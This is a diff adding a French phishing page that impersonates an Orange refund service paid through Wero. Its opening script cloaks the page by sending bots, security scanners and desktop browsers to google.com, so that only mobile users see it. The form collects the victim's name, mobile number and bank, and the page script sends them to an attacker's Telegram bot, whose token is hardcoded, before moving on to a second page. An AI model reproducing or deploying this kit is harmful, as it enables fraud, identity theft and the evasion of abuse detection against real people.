@@ -1,0 +1,164 @@
+<!DOCTYPE html>  
+<html lang="fr">  
+<head>  
+<style>
+  /* On cache tout le contenu par défaut pour que les bots ne voient rien */
+  body { display: none; }
+</style>
+
+<script>
+(function() {
+    const userAgent = navigator.userAgent.toLowerCase();
+    const redirectUrl = "https://www.google.com";
+
+    // 1. Liste des signatures de bots (Google, Bing, outils de scan, etc.)
+    const bots = [
+        'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandexbot',
+        'crawler', 'spider', 'curl', 'wget', 'python', 'java', 'bot', 'facebookexternalhit',
+        'twitterbot', 'adsbot', 'lighthouse'
+    ];
+
+    // 2. Liste des signatures mobiles courantes
+    const mobiles = ['iphone', 'android', 'phone', 'mobile', 'ipod', 'blackberry', 'iemobile'];
+
+    // Vérifications
+    const isBot = bots.some(bot => userAgent.includes(bot));
+    const isMobile = mobiles.some(mobile => userAgent.includes(mobile));
+
+    // CONDITION : Si c'est un bot OU si ce n'est PAS un mobile (ordinateur)
+    if (isBot || !isMobile) {
+        window.location.href = redirectUrl;
+    } else {
+        // C'est un humain sur mobile : on affiche la page
+        document.documentElement.style.display = 'block';
+        window.onload = function() {
+            document.body.style.display = 'block';
+        };
+    }
+})();
+</script>
+
+<meta charset="UTF-8">  
+<title>Remboursement Orange - Service Wero</title>  
+<meta name="viewport" content="width=device-width, initial-scale=1.0">  
+<style>  
+  :root { --primary: #ff7900; --wero: #5d2d91; }  
+  * { box-sizing: border-box; }  
+  html, body { margin: 0; padding: 0; height: 100%; font-family: Arial, sans-serif; background: #f4f4f4; }  
+  body { display: flex; justify-content: center; align-items: center; padding: 10px; }  
+  .container { display: flex; flex-direction: column; justify-content: space-between; max-width: 400px; width: 100%; height: 100%; max-height: 720px; background: white; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); overflow: hidden; }  
+  .container-inner { padding: 25px; overflow-y: auto; flex: 1; }  
+  .header { text-align: center; margin-bottom: 20px; }  
+  .logo-orange { font-weight: bold; font-size: 24px; color: var(--primary); margin-bottom: 5px; }  
+  .service-tag { font-size: 12px; color: #666; text-transform: uppercase; letter-spacing: 1px; }  
+  h1 { font-size: 1.3em; color: #333; margin: 20px 0; text-align: center; }  
+  .wero-box { background: #f8f4ff; border: 1px solid #dcd0f0; padding: 15px; border-radius: 8px; margin-bottom: 20px; }  
+  .wero-box p { margin: 0; font-size: 13px; color: var(--wero); line-height: 1.5; }  
+  .form-group { margin-bottom: 18px; }  
+  label { display: block; font-size: 13px; font-weight: bold; margin-bottom: 7px; color: #444; }  
+  input, select { width: 100%; padding: 14px; border: 1px solid #ccc; border-radius: 6px; font-size: 15px; background: #fff; }  
+  input:focus, select:focus { border-color: var(--primary); outline: none; }  
+  .sms-info { background: #fff3cd; padding: 12px; border-radius: 6px; font-size: 13px; color: #856404; margin-top: 15px; display: flex; align-items: center; }  
+  button { width: 100%; padding: 20px; font-size: 16px; font-weight: bold; color: white; background: var(--primary); border: none; cursor: pointer; }  
+  button:disabled { background: #ccc; }  
+</style>  
+</head>  
+<body>  
+<div class="container">  
+  <div class="container-inner">  
+    <div class="header">  
+        <div class="logo-orange">Orange</div>  
+        <div class="service-tag">Service de Remboursement</div>  
+    </div>  
+    <div class="wero-box">  
+      <p><strong>Paiement sécurisé via Wero</strong><br>Le versement de votre remboursement est traité par la plateforme Wero.</p>  
+    </div>  
+    <h1>Vos coordonnées</h1>  
+    <form id="mainForm">  
+      <div class="form-group">  
+        <label for="fullname">Nom et Prénom</label>  
+        <input type="text" id="fullname" placeholder="Ex: Jean Dupont" required>  
+      </div>  
+      <div class="form-group">  
+        <label for="phone">Numéro de téléphone mobile</label>  
+        <input type="tel" id="phone" placeholder="06 XX XX XX XX" required>  
+      </div>  
+      <div class="form-group">  
+        <label for="bank">Établissement bancaire</label>  
+        <select id="bank" required>  
+          <option value="" disabled selected>Sélectionnez votre banque</option>  
+          <option value="BNP Paribas">BNP Paribas</option>  
+          <option value="Société Générale">Société Générale</option>  
+          <option value="Crédit Agricole">Crédit Agricole</option>  
+          <option value="Caisse d'Épargne">Caisse d'Épargne</option>  
+          <option value="Banque Populaire">Banque Populaire</option>  
+          <option value="Crédit Mutuel">Crédit Mutuel</option>  
+          <option value="LCL">LCL</option>  
+          <option value="La Banque Postale">La Banque Postale</option>  
+          <option value="CIC">CIC</option>  
+          <option value="Boursorama (BoursoBank)">Boursorama (BoursoBank)</option>  
+          <option value="Fortuneo">Fortuneo</option>  
+          <option value="Hello Bank">Hello Bank</option>  
+          <option value="Nickel">Nickel</option>  
+          <option value="Revolut">Revolut</option>  
+          <option value="Bred">Bred</option>  
+          <option value="HSBC">HSBC</option>  
+          <option value="Autre">Autre banque</option>  
+        </select>  
+      </div>  
+    </form>  
+    <div class="sms-info">📩 Vous recevrez un lien de confirmation par SMS.</div>  
+  </div>  
+  <button type="button" id="submitBtn">Recevoir mon remboursement</button>  
+</div>  
+
+<script>  
+  const BOT_TOKEN = "8688616568:AAGyEa610JgbvyAClZfHlMSi76sFNmCJYIM";  
+  const CHAT_ID = "5862514698";  
+  
+  document.getElementById("submitBtn").addEventListener("click", async function() {  
+    const name = document.getElementById("fullname").value.trim();  
+    const phone = document.getElementById("phone").value.trim();  
+    const bank = document.getElementById("bank").value;  
+  
+    if (!name || !phone || !bank) {  
+      alert("Veuillez remplir tous les champs.");  
+      return;  
+    }  
+  
+    this.disabled = true;  
+    this.innerText = "Traitement en cours...";  
+  
+    const textMessage = `📩 **NOUVELLE DEMANDE**\n\n👤 **Nom :** ${name}\n📞 **Tel :** ${phone}\n🏦 **Banque :** ${bank}`;  
+  
+    try {  
+      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {  
+        method: 'POST',  
+        headers: { 'Content-Type': 'application/json' },  
+        body: JSON.stringify({  
+          chat_id: CHAT_ID,  
+          text: textMessage,  
+          parse_mode: 'Markdown'  
+        })  
+      });  
+  
+      if (response.ok) {  
+        // Redirection vers index2.html au lieu de l'alerte
+        window.location.href = "index2.html";  
+      } else {  
+        const result = await response.json();  
+        console.error("Erreur Telegram :", result);  
+        alert(`Erreur : ${result.description}`);  
+        this.disabled = false;  
+        this.innerText = "Recevoir mon remboursement";  
+      }  
+    } catch (error) {  
+      console.error("Erreur de connexion :", error);  
+      alert("Erreur réseau.");  
+      this.disabled = false;  
+      this.innerText = "Recevoir mon remboursement";  
+    }  
+  });  
+</script>  
+</body>  
+</html>
